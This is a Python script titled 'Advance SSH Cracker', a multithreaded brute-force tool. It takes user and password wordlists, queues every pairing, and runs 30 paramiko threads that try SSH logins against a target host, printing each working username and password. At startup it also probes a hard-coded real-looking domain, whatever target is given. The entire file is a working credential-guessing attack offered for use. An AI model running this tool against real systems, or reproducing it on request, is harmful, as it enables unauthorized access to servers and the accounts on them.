import socket
import paramiko
import argparse

from threading import Thread, Lock
from queue import Queue

combo_queue = Queue()
result_lock = Lock()


parser = argparse.ArgumentParser(description="Advance SSH Cracker")

parser.add_argument("-t","--target",required=True,type=str,help="Enter The target")
parser.add_argument("-u","--user",type=str,required=True,help="Enter the user or a Wordlist to user names")
parser.add_argument("-p","--passwd",type=str,required=True,help="Enter the path to wordlist containing passwords")


args = parser.parse_args()

host = args.target
user = args.user
passwd = args.passwd


def check_ssh(ip="steminfinity.in", port=22, timeout=3):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            
            print("Success")
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        print("Failure")
        return False


check_ssh()



def userb(user):
    with open(user , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    


users = userb(user)


def words(passwd):
    with open(passwd , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    

passwords = words(passwd)



client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


for userc in users:
    for password in passwords:

        try:
            #client.connect(hostname=host,username=user, password=password, timeout=3)
            #print(f"connection Success🏀🏀🏀🥎🥎⚾⚾⚽⚽💎💎💍💍💍 with {host}")
            combo_queue.put((userc,password))

        except Exception as e:
            print(f"Connection Failed with {host}")




def ssh_worker():
    while not combo_queue.empty():
        user , password =  combo_queue.get()
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host,username=user, password=password, timeout=3)


            with result_lock :
                print(f"Success {user}  :   {password}")
            
            client.close()

        except Exception as e:
            with result_lock:
                print(f" Failure with {host}")

        finally:
            combo_queue.task_done()





threads = []

for _ in range(30):
    t = Thread(target=ssh_worker)
    t.start()
    threads.append(t)



for t in threads:
    t.join()



